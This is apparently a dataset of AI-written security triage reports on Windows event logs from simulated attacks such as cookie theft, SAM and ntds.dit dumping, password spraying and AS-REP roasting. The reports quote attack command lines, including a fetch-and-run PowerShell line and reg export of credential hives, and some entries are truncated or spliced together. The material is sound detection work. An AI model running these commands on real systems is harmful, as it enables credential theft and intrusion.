- The logs primarily show updates related to the ""Security Intelligence Update for Microsoft Defender Antivirus."" These updates are regular and expected on a Windows system receiving automatic updates.
- Event IDs 43, 44, and 19 indicate successful management of these updates, which is indicative of normal system behavior.

### Application Log:
- The log shows Windows Defender is active with the state ""SECURITY_PRODUCT_STATE_ON."" This indicates that the system's antivirus is functioning, which is a positive sign for system security.
  
### Security Log:
- Event ID 4624 and 4672 show a successful logon (Type 3 - Network) as the user ""admin_test"" with high privileges (a list of privileges like SeDebugPrivilege, SeBackupPrivilege, etc.). While the privileges indicate administrative access, these alone do not indicate malicious activity unless paired with suspicious actions.
- There are a series of Event ID 5379 logs, which could correlate to credential management activities. The return codes indicate unsuccessful attempts at some operations but lack additional context to assess whether these are suspicious or routine attempts at credential management.

### Sysmon Log:
- Frequent usage of utilities such as ""wevtutil.exe,"" ""cmd.exe,"" ""whoami.exe,"" and ""cmdkey.exe"" can potentially raise eyebrows, especially in rapid succession, suggesting possible script execution or system enumeration.
- ""cmdkey /list"" usage might suggest someone's trying to enumerate stored credentials. Combining this action with admin rights could suggest credential harvesting attempts.
- Notably, the execution of ""cmd.exe /c cmdkey /list"" seems suspicious as it could denote potentially unwanted credential enumeration.

### Conclusions and Recommendations:
- **SUSPICIOUS Activity Identified**: The combination of high privileges with sensitive command-line invocations, particularly the enumeration of credentials using cmdkey, warrants further investigation.
  
**Guidance:**
1. **Immediate Steps**:
   - Verify if the user ""admin_test"" was expected to perform the series of actions logged during the session.
   - Conduct a review of any scripts or automated tasks that could explain the rapid execution of these utilities.

2. **Long-Term Steps**:
   - Implement tighter monitoring on similar administrative activities and command-line tool usage.
   - Review and possibly enhance the security policies for the storage and access of credentials on the system.
   - Conduct a formal user activity audit around the timeframe of these logs.

The identified suspicious behaviors necessitate a closer look to ascertain if they signify a genuine compromise or merely overzealous administrative practices."
WinPwn - SessionGopher,"### Detailed Analysis

#### 1. **Windows PowerShell Log Analysis:**
- Several PowerShell events indicate the execution of a script downloaded from a suspicious external URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). Such behavior is typically indicative of potentially malicious activities such as script-based attacks.
- The use of `iex(new-object net.webclient).downloadstring(...)’ is a common method for executing scripts directly from the internet, often seen in malware operations.

#### 2. **System and Security Logs:**
- System log entries (EventID 1 and EventID 24 from Microsoft-Windows-Kernel-General) show time changes, but these appear related to the synchronization with the NTP server `time.windows.com`, a benign operation. The consistent use of `svchost.exe` in time updates is typical for legitimate system process operations related to Windows Time Service.
- Security log events (EventID 4616) show time update synchronized with system log entries. There's no immediate indication of privilege escalation or unauthorized access within this log.

#### 3. **Sysmon Log Analysis:**
- Multiple processes executed as `admin_test` with high integrity, including legitimate Windows binaries like `whoami.exe`, `conhost.exe`, and system management tools such as `wevtutil.exe`. The usage of these tools by legitimate users or processes is common for system enumeration and log management but could be leveraged by malicious users for reconnaissance if paired with other suspicious activities.
- A suspicious PowerShell process (`powershell.exe`) aligns with the PowerShell log, indicating the same malicious script execution.

#### 4. **Application Log:**
- Records from the `SecurityCenter` showing Windows Defender in a `SECURITY_PRODUCT_STATE_ON` state, suggesting that real-time protection was active. This serves to highlight the nominal state of endpoint protection at the time of these events.
- `edgeupdate` service stopped events (EventID 0) align with routine update stopping but appear benign when considering Microsoft Edge updates.

### Assessment
Based on the above analysis:
- **PowerShell execution** from an unknown URL implies significant indicators of a potential compromise and malicious activity. This script download and execution method is often leveraged in malicious attacks.
- **System and Security events** appear benign, showing regular time synchronization and normal operations.
- **Sysmon events** indicate legitimate process execution, but the PowerShell activity stands out as concerning.

### Resolution:
- **MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions:**
  - Isolate affected host (`Server002`) from the network to prevent further potential harm or spread.
  - Investigate network logs and firewall settings for any connections to the identified suspicious URLs.
  - Conduct a full antivirus and anti-malware scan on the host, specifically focusing on PowerShell scripts and actions.
  
- **Further Investigation:**
  - Analyze the external script being executed to understand its functions and potential payloads.
  - Review the configuration and policies related to PowerShell execution in your environment. Enforce policies that require scripts to be digitally signed.
  - Enhance monitoring on such types of executions and implement alerting mechanisms.

- **Long-term Recommendations:**
  - Educate users on malicious activities via script delivery and execution tactics.
  - Regularly update and patch systems and applications to minimize vulnerability exploitation.
  - Consider implementing Application Whitelisting, which blocks unauthorized scripts and executives."
Enumeration for PuTTY Credentials in Registry,"### Analysis of Windows Event Logs

Upon reviewing the provided logs, a series of events stand out as being potentially suspicious:

1. **Time Manipulation:**
   - **Security Log (EventID 4616) and System Log (EventID 1):** There are multiple instances indicating a change in system time. This kind of behavior can be associated with attempts to manipulate log timelines, potentially to interfere with security monitoring or incident investigation processes.
   - The previous and new times are unusual and hint toward manual adjustments rather than automated adjustments or Daylight Saving Time changes.

2. **Privilege Elevation:**
   - **Security Log (EventID 4672):** The user “admin_test” was granted several advanced privileges including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeTakeOwnershipPrivilege`. While high-privileged actions can occur in administrative contexts, this escalates the risk significantly when paired with other suspicious activities.
   - The presence of these privileges, particularly `SeDebugPrivilege`, could threaten system integrity if leveraged maliciously.

3. **Process Execution:**
   - **Sysmon Log Events (EventID 1 and 5):** There are numerous executions of Windows utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`) by the user “SERVER002\admin_test”. While these commands themselves are not inherently malicious, the presence of `cmd.exe` querying registry keys related to PuTTY sessions is suspicious and can be aligned with reconnaissance activities commonly observed in attacks.
   - The utilization of `hostname.exe` and `whoami.exe` might indicate an attempt to gather environmental or user information which typically is not necessary without specific intent in routine operations.

4. **NTLM Authentication Logon:**
   - **Security Log (EventID 4624):** This logon is of type 3, typically associated with network connections. The usage of NTLM indicates a kind of network authentication that might be weaker or exposed in certain configurations unless specifically secured.

5. **Microsoft Edge Updates:**
   - Numerous events are related to the execution of Microsoft Edge and its update processes running under the `SYSTEM` context. The presence could be typical update behavior, yet if unexpected, warrants verification via patch management logging.

### Threat/Risk Assessment
- The adjustment of system time, execution of forensic-related commands (e.g., `whoami`, `hostname`), and registry queries alongside advanced privilege assignments collectively raise suspicions of potential compromise or at least atypical behavior under administrative influence.
  
- The server's state, external connection logs, or additional correlations might be needed for confirmation, particularly for the purported end-user involvement in `admin_test` account activities to ensure the actions align with that user's routine functions.

### Conclusion and Resolution
Given the provided data, while not definitively identifying a compromised state, the combination of events such as privilege grants, strange process executions, unusual system time changes, and registry reconnaissance aspect does not adhere to typical benign behaviors expected in a controlled environment.

### Resolution
- **Resolution: SUSPICIOUS** - The logs contain activity that doesn't look right and needs further investigation into the context and cause behind the events. Further examination with additional telemetry or contextual inputs (e.g., comparing workload logs, user activity reports, and security control reviews) is recommended to ensure no malicious activities are present."
Create Volume Shadow Copy with Powershell,"Upon analysis of the provided Windows event logs, several key observations can be drawn, highlighting both suspicious activities and expected routine operations:

**1. Indicators of Suspicious Activity:**

- **PowerShell Activity:**
  - The use of `powershell.exe` invoking the command `gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')` is potentially suspicious. Creating shadow copies could be indicative of malicious behavior, especially in the context of ransomware or data exfiltration attempts.
  - This action is noteworthy as it attempts to create a volume shadow copy without more context, which could indicate data preservation or protection maneuvers often leveraged by malware.

**2. Sysmon Logs:**
  - Extensive execution of `wevtutil.exe` and `conhost.exe` are observed, facilitated by the user `admin_test`. The presence alone of these processes isn’t directly malicious, but they can be used to clear event logs or manage console hosts, which may be part of a recon or cover-up activity if combined with other actions.
  - The execution of `powershell.exe` from what appears to be a temp directory with an accompanying suspicious PowerShell command line (`gwmi -list win32_shadowcopy`) confirms potential illicit activity.

**3. Security Logs:**
  - Event `4624` (successful user logon) and subsequent `4672` events (special privileges assigned) for the account `SYSTEM` occur frequently but don’t inherently indicate malicious activity. However, the timing and frequency should be rhythmically considered with other suspicious activities for potential abuse.
  - Several account management events associated with `C:\\Windows\\System32\\VSSVC.exe` were logged, which historically could correlate with system or backup activities - normal in isolation but questionable due to the simultaneous suspicious PowerShell activity.

**4. System Logs:**
  - Events indicating Windows update actions (e.g., `wuauclt.exe` and `MP_SigStub.exe` usage) are consistent with system updates and maintenance, which align with expected legitimate activities.

**Conclusion:**
The combination of events in the logs indicates a potential environmental anomaly. The PowerShell command executed to create shadow copies, coupled with the high-integrity level PowerShell executions and manipulations around `wevtutil.exe`, raise a red flag.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct deeper investigation into the ‘admin_test’ user activities and the context of using PowerShell to execute high-privilege commands.
- Review the system for any unauthorized installations or changes.
- Consider implementing monitoring and alerting for further suspicious usage of shadow copies and critical system processes.
- It is advisable to conduct a thorough audit and take preventative measures to ensure no compromise has occurred or spread further in the network."
Steal Chrome Cookies (Windows),"Based on the analysis of the provided Windows event logs, several points of interest stand out that may suggest suspicious or potentially malicious activity. Here's a breakdown of the events and associated behaviors:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution with Questionable Command:**
   - The Sysmon logs and Windows PowerShell logs indicate the execution of a PowerShell command which is used to stop ""chrome"" processes and execute an SQLite command to extract browser cookies. This is evident in the `powershell.exe` and subsequent `sqlite3.exe` processes.
   - The command aims to extract sensitive cookie data from Google Chrome's cookie storage and output it to a file (`dataChromeCookies.txt`) in a temporary directory, which is considered suspicious and typical of data harvesting behavior.

2. **Processes Executed as SYSTEM:**
   - Several processes relate to Microsoft Edge Update activities, executed under `NT AUTHORITY\SYSTEM`, which appears legitimate and consistent with system update tasks. However, these events should be reviewed in conjunction with other anomalies to confirm legitimacy.

3. **Service Stop Events:**
   - The application logs show two instances where the `edgeupdate` service was stopped. While this is not inherently suspicious, it aligns temporally with other questionable activities.

### Assessment:

**Indicator of Malicious Activity:**
- The PowerShell script intends to terminate the Chrome process and extract cookie data without user consent, suggesting possible credential theft or data exfiltration. The script execution path also includes the use of temporary directories often leveraged by attackers to cover tracks.

**Legitimate and Expected Activity:**
- The Microsoft Edge Update processes appear consistent with legitimate software update operations handled by the system. Although frequent execution of service-related tasks (like updating or installing) is normal for these applications, it should be validated that these tasks were conducted as expected under proper administrative oversight.

### Threats or Risks Identified:

- The primary threat identified is the unauthorized access and potential exfiltration of user data (browser cookies) which may include credentials or session information if decrypted.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Review recent access logs and network traffic to determine if any data was exfiltrated. 
   - Change credentials for any accounts that may have been logged into via Chrome on the affected machine.

2. **Investigation & Forensic Analysis:**
   - Conduct a deeper forensic analysis of the system to determine how this PowerShell script was executed and by whom.
   - Verify that Edge Update processes match known signatures and network destinations for legitimate connections.

3. **Mitigation Steps:**
   - Review all scheduled tasks and startup entries for unauthorized or unknown tasks.
   - Strengthen monitoring of PowerShell script executions and enhance auditing to detect similar command patterns.
   - Update antivirus/anti-malware definitions and perform a full system scan.

4. **Improve Compliance and Awareness:**
   - Educate users regarding the risks of malware and suspicious downloads, emphasizing caution around unknown executables.
   - Regularly patch and update all software, especially web browsers and their associated components.

### Resolution:
Overall, given the presence of a malicious PowerShell script aimed at acquiring potentially sensitive data without authorization, the resolution for these logs is **MALICIOUS**. Further investigation is crucial to remediate the existing threat and prevent future compromise.
"
Create Volume Shadow Copy remotely (WMI) with esentutl,"### Analysis of Logs:

The provided Windows event logs were examined for indications of unusual or potentially malicious activities. Below is the detailed analysis of the logs:

#### Application Log:
- The entries for the `VSS` provider with EventIDs `13` and `8193` indicate a consistent issue with `CoInitialize` not being called. These are typically VSS (Volume Shadow Copy Service) errors, which are common in environments where the service configuration might be incorrect or lacking required permissions. These do not directly indicate malicious activity but could potentially disrupt backup services.

- The `Microsoft-Windows-Security-SPP` event with EventID `16384` doesn't show any immediate concerns as it usually logs status information about the software protection platform.

#### Security Log:
- The event with Security-Auditing, EventID `4799`, shows a privilege escalation where `admin_test` is adding a user to the 'Administrators' group. The action performed by `C:\Windows\System32\esentutl.exe`, a legitimate executable, seems typical of an escalation of privileges. However, the context around this action is not clear (i.e., whether this was an authorized action), which makes it suspicious and requires further investigation.

#### Sysmon Log:
- Multiple events are logged for processes such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe`, executed by `admin_test`. The combination of using these executables, especially with the commands involving manipulation and copying of the `ntds.dit` file via `esentutl.exe`, is highly suspicious. This behavior is associated with attempts to extract sensitive database files potentially for credential dumping.
  
- Specifically, the command `""cmd.exe"" /c wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit""` indicates an attempt to use VSS to copy the Active Directory database to another location. This technique is often used by attackers to exfiltrate credentials.

#### System Log:
- The Windows Update Client event shows simply a routine update for Microsoft Defender, which is benign.

### Assessment:
Based on the logs provided:
1. The repeated execution of processes by the user `SERVER002\admin_test` showing commands involving `esentutl.exe` related to the Active Directory databases (`ntds.dit`) are potential indicators of a compromise.
2. The privilege escalation event is suspicious and should be verified for legitimacy.

### Guidance:
- Immediately verify with the system administration team if there was any authorized or scheduled task intended to manipulate the `ntds.dit` database.
- Investigate the account `admin_test` actions preceding the indicated times for any unauthorized access or anomalies in behavior.
- Review whether the actions involving `wmic`, `wevtutil.exe`, and `esentutl.exe` were part of any sanctioned activity.
- Based on findings, consider isolating the affected systems and resetting passwords for sensitive accounts to mitigate potential leaks.

### Resolution:
**MALICIOUS** - The presence of actions that aim to duplicate and potentially extract the `ntds.dit` file aligns with known malicious activities. Immediate attention and remediation steps are necessary."
Password Spray using Kerbrute Tool,"**Detailed Analysis:**

1. **Suspicious Powershell Activity:**
   - **EventID 1 & 5 (Sysmon Log):** A PowerShell command-line execution is observed with the following command: 
     ```
     ""powershell.exe"" & {cd \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\\"", .\\script.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\passwordspray.txt\"" password132}
     ```
   - This command attempts a password spray attack, which is indicative of malicious activity. Password spraying is a common method used by attackers to compromise accounts by testing a single commonly-used password against many accounts.

2. **Wevtutil Activity:**
   - **EventID 1 (Sysmon Log):** We observe multiple instances of `wevtutil.exe` being executed to export event logs:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx
     ```
   - This can be considered suspicious if it wasn't known or scheduled administrative activity, as attackers often export logs to analyze them or evade detection.

3. **User Account Queries:**
   - **EventID 4798 (Security Log):** There are repeated user account enumeration attempts logged. This can be a precursor to an attack where an attacker attempts to gather information on user accounts available on the system.

4. **Privilege Escalation Indications:**
   - **EventID 4672 (Security Log):** Privileged account logins with special privileges. This may not by itself be suspicious, but correlated with other events, it might signal an attempt to escalate privileges within the system.

5. **Use of Hostname and Whoami Commands:**
   - **EventID 1 (Sysmon Log):** Commands `hostname.exe` and `whoami.exe` are executed. Attackers often use these commands to gather information about the operating environment and user context.

**Assessment of the Situation:**

Based on the above observations, there is clear evidence of malicious activity present in the logs:
- The presence of a password spraying attempt indicates an active attack.
- The use of `wevtutil.exe` to export event logs can suggest attempts to cover tracks or analyze system logs further.
- Repeated user enumeration attempts and execution of system commands like `hostname` and `whoami` point towards activity consistent with reconnaissance and privilege escalation attempts.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Isolate the affected system from the network immediately to prevent any further compromise.
- Begin an in-depth forensic analysis to understand the scope of the compromise, including memory forensics and analysis of any network connections or data exfiltrated.
- Reset passwords for all potentially impacted accounts, especially public-facing accounts.
- Review and enhance security measures to prevent similar intrusions in the future, including multi-factor authentication, logging enhancements, and elevated monitoring.
- Notify your incident response team and potentially law enforcement, depending on the severity of the breach and company policy."
Dump Chrome Login Data with esentutl,"Based on the provided Sysmon log data, here is the detailed analysis:

1. **PowerShell Execution**:
   - An execution of `powershell.exe` is noted, which in itself is not inherently suspicious. However, further scrutiny into the PowerShell logs (if available) could provide more insights into command-line arguments or scripts executed. Without additional context, this activity is **SUSPICIOUS** given that PowerShell is a common tool for managing Windows systems but also frequently used in attacks.

2. **Process Creation**:
   - Multiple instances of `conhost.exe` are running with parent processes being utilities like `wevtutil.exe` and `whoami.exe`. `conhost.exe` typically runs to provide a console for command-line applications; its presence in conjunction with utilities is normal. However, the pattern and frequent launching in the span of seconds raise questions but do not provide enough evidence of illicit activity by themselves.

3. **Suspicious Command Execution**:
   - The `cmd.exe` invocation with the command-line `esentutl.exe /y ...` copying `Google Chrome` login data to a temporary location is highly suspicious. Such behavior could indicate credential theft or preparation for exfiltration. This usage of `esentutl.exe` is indicative of potentially malicious activity aiming to extract stored credentials.

4. **Utility Execution**:
   - The launcher of `whoami.exe` and constant invocation of `wevtutil.exe` suggests reconnaissance and possibly tampering with event logs, which are common post-compromise activities.

5. **Unusual Behavior**:
   - The parent process for several actions is `wsmprovhost.exe` with `-Embedding`, which indicates Windows Remote Management Provider Host service activity. If service activity coincides with off-hours or unexpected periods, it potentially indicates unauthorized remote access unless corroborated by typical admin tasks.

**Conclusion**:

Given the observed behaviors:
- Use of utilities to potentially manipulate and exfiltrate credentials.
- Repeated invocation of processes in rapid succession without apparent legitimate administrative reason.
- Indications of potential unauthorized system reconnaissance.

I assess this log activity as **MALICIOUS**. There are strong indicators of credential theft operations and potential remote administration abuse without clear legitimate context.

**Guidance**:
1. Conduct an immediate endpoint isolation from the network to prevent further compromise.
2. Analyze PowerShell logs (if available) to track executed scripts or commands.
3. Review access logs and service accounts for anomalies around the `wsmprovhost.exe`.
4. Extract and analyze full event logs to understand the scope of activities around these timestamps.
5. Monitor any data transmission during these activities to assess potential data exfiltration.
6. Consider a precautionary credential reset for affected accounts to mitigate further misuse."
Create Symlink to Volume Shadow Copy,"Based on the provided logs, a thorough analysis reveals several points of interest:

### System and Security Logs:
1. **Microsoft Defender and Windows Update Activities:**
   - The logs show Windows Defender Antivirus (KB2267602) updates, which are expected routine activities, given the update titles and GUIDs.
   - Logs indicating `wuauclt.exe` and `AM_Delta.exe` executions are part of the Windows Update process and are not inherently suspicious.

2. **Privileges and Login Events:**
   - There are logs indicating that the user `admin_test` was granted several privileges, including `SeDebugPrivilege`, which can pose a security risk if assigned improperly. The presence of such privileges should be verified against user roles and responsibilities.
   - Successful logon events from an external workstation (IP addresses `fe80::9dcf:4519:45e7:eba2` and `fe80::e3b5:5371:12a8:9c77`) using NTLM, which should be standard if the workstation is trusted.

### Sysmon Logs:
1. **Process Executions:**
   - Multiple legitimate system processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `HOSTNAME.EXE`, and `taskhostw.exe` are executed by the user `admin_test`.  
   - The `cmd.exe` being executed with the command `vssadmin.exe create shadow /for=C: & mklink /D C:\\Temp\\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1` is suspicious. The use of `vssadmin.exe` to create shadow copies and make symbolic links is a known technique used by attackers to maintain persistence or exfiltrate data.
   - `vssadmin.exe` execution under a user context that seems unnecessary for typical user tasks can be suspicious and needs further validation for legitimacy.
   
### Threat Assessment:
- The execution of `vssadmin.exe` with the intent to create shadow copies without a documented legitimate purpose could indicate a possible precursor to an attack, such as data exfiltration or ransomware activity.
- The elevated privileges assigned to the `admin_test` account warrant verification to prevent potential misuse leading to privilege escalation scenarios.

### Resolution:
Based on the analysis of the logs, the resolution can be categorized as **SUSPICIOUS**. This conclusion arises from potential misuse of shadow copy creation, elevated privileges, and external logins that collectively indicate abnormal activities.

### Guidance:
- **Further Investigation:**
  - Validate the necessity and approval of the commands involving `shadow copy` creation under the context of the `admin_test` account.
  - Review and verify the source and legitimacy of the remote login events.
  - Assess the specific need for elevated privileges and their appropriateness for the `admin_test` account.

- **Immediate Actions:**
  - Monitor the user `admin_test` for further suspicious activity.
  - Audit and restrict privileges as appropriate to mitigate potential risks.
  - Conduct endpoint scanning for malware or unauthorized software.

- **Long-term Considerations:**
  - Implement strict change management and auditing for privilege assignments.
  - Reevaluate security policies concerning remote access and high privilege allocations. 

By following these guidelines, you can better ascertain the risk level and take preventative measures against potential threats."
Rubeus asreproast,"Based on the provided Windows event logs, the following analysis indicates potential malicious activity:

### Suspicious Activities:
1. **PowerShell Activity:**
   - Multiple instances of `powershell.exe` executing with a command line that includes `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.exe"" asreproast /outfile:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script_output.txt""` are identified.
   - Using PowerShell combined with `cmd.exe` for executing a script in the Temp directory is suspicious. The term `asreproast` suggests potential use of a tool related to Kerberos AS-REP roasting, a technique often used in unauthorized harvesting of credentials in Active Directory environments.

Password Cracking with Hashcat,"Upon reviewing the provided Windows event logs, several observations can be made:

1. **Security Event Logs**:
   - Multiple `EventID 4624` entries indicate successful logons with `LogonType 5` which suggests a service logon. This is typical behavior for system processes.
   - The `EventID 4672` entries show that the `SYSTEM` user is being granted a number of high-privilege rights, which is normal for critical system operations.
   - There are multiple `EventID 4798` entries indicating enumeration of local group membership for various users; this could suggest an auditing process or potentially a reconnaissance activity.
   - `EventID 5379` logs with return code `3221226021`, representing attempts to enumerate credentials, are repeatedly failing. This could potentially be suspicious, especially if unexpected or unauthorized.

2. **Sysmon Logs**:
   - The execution of `cmd.exe` with the command line associated with `hashcat.exe` is suspicious as `hashcat` is a well-known password cracking tool. The high integrity level indicates `admin_test` executed this with elevated privileges.
   - Frequent execution of `wevtutil.exe`, `conhost.exe`, and other system utilities by `admin_test` suggests potential malicious behavior such as event log clearing or manipulation.
   - The command-line executions and creation of processes such as `hashcat` under `admin_test`'s context can be a strong indicator of malicious intent, particularly if this user account is not expected to run such tools.

3. **Observations**:
   - The combination of failed credential enumerations, execution of `hashcat`, and enumeration of group memberships is characteristic of possible malicious activity, such as attempting to crack passwords and further explore user privileges.
   - Process executions related to system management tasks and telemetry may be legitimate but should be correlative with scheduled tasks or system updates.

- Review logs and alerts from any endpoint protection solutions and SIEM (Security Information and Event Management) systems for correlated alerts."
Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"Upon carefully analyzing the provided Windows event logs across various channels (System, Security, Application, Sysmon, and Windows PowerShell), we can identify certain activities and determine their nature:

### Key Observations:

1. **Time Synchronization in System Logs**:
   - Multiple events are logged concerning time adjustments (EventID 24 & 1), likely due to synchronization activities which are normal on Windows systems. These events are benign and do not indicate malicious activity.

2. **Standard Services Operations in Security Logs**:
   - Events 4616 denote system time changes by the `svchost.exe` operating under `LOCAL SERVICE`. This appears to be legitimate and corresponds to typical service behavior related to time sync.

3. **Software Protection Platform Service in Application Logs**:
   - EventID 16384 underlines the regular operation of the Software Protection Platform, an expected activity on a Windows host.

4. **Process Execution in Sysmon Logs**:
   - Processes such as `whoami.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `wevtutil.exe` are executed by a user (SERVER002\admin_test) with high integrity. These processes are typical system utilities:
     - `whoami.exe` determines the current user identity.
     - `conhost.exe` is a console window host.
     - `wevtutil.exe` is often used for managing logs.
     - `HOSTNAME.EXE` simply returns the host name.
   - However, the presence of `powershell.exe` with an NTLM-based password spraying script (as extracted from the logs) indicates potentially malicious activity. The command aims to authenticate using the password ""P@ssw0rd!"" against domain users, indicative of an attempt to compromise user accounts.

5. **PowerShell Script Activity in Windows PowerShell Logs**:
   - The PowerShell events capture a script explicitly aimed at “password spraying”, attempting NTLM authentication across domain users. This is highly suspicious and aligns with malicious password attack behavior.

### Assessment:
- The initial system and service activities are **benign**.
- The execution of legitimate Windows utilities by the admin_test user is **benign** on its surface; however, the context provided by the PowerShell activity marks it as **malicious**.
- The PowerShell activity explicitly aimed at password spraying, using a common password across potentially multiple accounts, confirms **malicious intent**.

### Conclusion:
The logs signify that while several routine operations are taking place, a malicious PowerShell script is executing a password spraying attack on the system. This type of attack seeks weak passwords and attempts unauthorized access to user accounts.

### Resolution:
**MALICIOUS** - The logs confirm malicious activity due to the attempted password spraying attack using PowerShell.

### Recommended Action:
- Immediately isolate the affected host (`Server002`) to prevent further potential lateral movement.
- Conduct a comprehensive investigation to identify any compromised credentials or further malicious activity.
- Review and enhance password policies to prevent the use of weak credentials.
- Monitor Windows PowerShell execution and logs regularly for similar activities.
- Train users to recognize social engineering attacks that may lead to credential compromise."
dump volume shadow copy hives with certutil,"### Analysis

Upon reviewing the provided Windows event logs, I have identified several key points that warrant further discussion:

1. **Sysmon Log Observations**:
    - There are multiple instances of the `whoami.exe`, `cmd.exe`, and `certutil.exe` processes being executed from a user directory (`C:\Users\admin_test\Documents` and `C:\Windows\System32\\`) with a high integrity level. These processes are legitimate Windows utilities, but their usage can be indicative of malicious activity if utilized in unusual contexts.
    - A specific **command line** executed by `cmd.exe` is highly suspicious:
        ```
        ""cmd.exe"" /c for /L %%a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%%a\Windows\System32\config\SAM"" %%temp%%\SAMvss%%a 2 >nul 2>&1) & dir /B %%temp%%\SAMvss*
        ```
      - This command attempts to access and copy SAM (Security Account Manager) files from volume shadow copies, indicating a potential attempt to exfiltrate user credential information.
    - Furthermore, `certutil.exe` is utilized subsequently to encode these SAM files, adding to the suspicion of credential dumping attempts.

2. **Routine Activities in Application Logs**:
    - The application log events revolve around the `Microsoft-Windows-Security-SPP` provider, which refers to the Windows Software Protection Platform Service. The events here seem related to typical license or activation checks and don't indicate any apparent malicious activity.

### Guidance on How to Proceed:

1. **Immediate Response Actions**:
   - Isolate the affected system from the network to prevent further exfiltration of data.
   - Conduct a comprehensive forensic analysis to identify the full scope of the breach.
   - Enumerate any users or services that might have been compromised.

2. **Further Investigation**:
   - Inspect any anomalies in network activity around the time of these events for potential exfiltration attempts.
   - Review historical logs for persistence mechanisms and any other compromised actions not immediately visible.

3. **Preventative Measures**:
   - Conduct security awareness training focusing on protecting sensitive credentials and monitoring tools.
   - Ensure logging and alerting are configured effectively to detect similar future activities.
   - Regularly review and audit critical systems, especially those handling sensitive data like Active Directory."
Decrypt Mozilla Passwords with Firepwd.py,"Upon analyzing the provided Windows event logs, several observations can be made:

### Suspicious Behavior:
1. **PowerShell Execution:**
   - There are entries in the PowerShell logs indicating the execution of a PowerShell script that attempts to locate the Firefox profile directory and then executes a Python script. This command retrieves potentially sensitive data (`$PasswordDBLocation`) and redirects the output to a temporary text file (`$env:temp\\data.003Test8.txt`).
   - The use of PowerShell to execute commands like `cmd /c` and involve Python scripts to access potential passwords indicates an uncommon and possibly malicious behavior, especially if done without user consent or expectation.

2. **Sysmon Logs:**
   - The Sysmon logs record several processes launched by the user `SERVER002\\admin_test`, including the execution of `cmd.exe` in conjunction with PowerShell, which aligns with the PowerShell logs. 
   - A number of other system utilities (`wevtutil.exe`, `conhost.exe`) are launched, which, while not inherently malicious, should be examined for context within this activity.
   - The presence of processes like `whoami.exe`, `hostname.exe` can be normal in some diagnostic situations, but when combined with the PowerShell activity noted, they raise suspicion.

3. **Application Logs:**
   - There is evidence of Python 3.10 installations being conducted around the same time as the PowerShell script execution. This might be legitimate, but if unauthorized, it compounds the potential for misuse.

### Assessment:
The detailed activities within these logs suggest actions that are consistent with the behavior of attacks focused on collecting sensitive information, particularly from user profiles. The execution of Python scripts targeting browser directories (like Firefox profiles) for potential credential extraction is a common tactic in data theft. Given the usage of PowerShell and Python in unusual contexts, along with a series of other command executions, this suggests potentially harmful intentions.

### Guidance:
1. **Immediate Action:**
   - Isolate the machine (Server002) to prevent further data exfiltration or lateral movement within the network.
   - Change all credentials associated with `SERVER002\admin_test` and any other potentially compromised accounts.

2. **Further Investigation:**
   - Conduct a thorough forensic analysis of the temporary files and scripts used.
   - Review additional logs preceding these events to identify any initial access vectors or persistent threats.
   - Ensure all sensitive information (e.g., passwords, cookie data) that could have been accessed is verified and invalidated.

3. **Preventive Measures:**
   - Implement stricter PowerShell logging and reduce script execution unless necessary.
   - Monitor for abnormal user behavior with tools like UEBA (User and Entity Behavior Analytics).

### Final Resolution:
- **MALICIOUS** - The presence and execution patterns of PowerShell scripts targeting sensitive user profile data combined with the accompanying processes indicate clear signs of malicious activity. Immediate containment and further forensic investigation are warranted."
"Dumping of SAM, creds, and secrets(Reg Export)","Upon reviewing the provided Windows event logs, there are multiple entries that warrant close attention due to potential indications of suspicious or malicious activities.

### Suspicious/Malicious Activities Identified:

1. **Registry Dumping:**
   - There is a `cmd.exe` process execution with a command line that involves exporting registry hives: `""cmd.exe"" /c reg export HKLM\sam %temp%\sam & reg export HKLM\system %temp%\system & reg export HKLM\security %temp%\security` (ProcessId: 5016).
   - This activity is typically associated with credential dumping, as an attacker might try to obtain hashed credentials from the SAM, SYSTEM, and SECURITY registry hives.

2. **High Integrity Level and Execution Context:**
   - The processes are being executed with high integrity, which implies elevated privileges. Combined with registry dumping, this is indicative of privilege exploitation.

3. **Repeated Execution of System Utilities:**
   - Processes such as `whoami.exe`, `hostname.exe`, and multiple instances of `conhost.exe` are seen, which in isolation may appear benign, but could also be indicative of reconnaissance activities when viewed collectively and in conjunction with other logs.

4. **Time Sync Events:**
   - There are logs showing time synchronization (EventID 4616) through `svchost.exe`. Although this is common for system time adjustments, it is worth noting if the time changed unexpectedly.

### Assessment:
The logs demonstrate activities that are highly indicative of compromise, particularly focusing on the registry exports that are commonly linked to credential theft methods used by attackers.

### Recommendations:
- **Immediately review user account activities**, especially those of ""SERVER002\admin_test"". Investigate whether these actions were authorized or conducted by a legitimate user.
- **Conduct a thorough check of network traffic** around the time of these events to identify any potential data exfiltration.
- **Isolate the affected system temporarily** and perform a deep analysis to check for other signs of compromise such as suspicious new accounts, services, or any unauthorized changes.
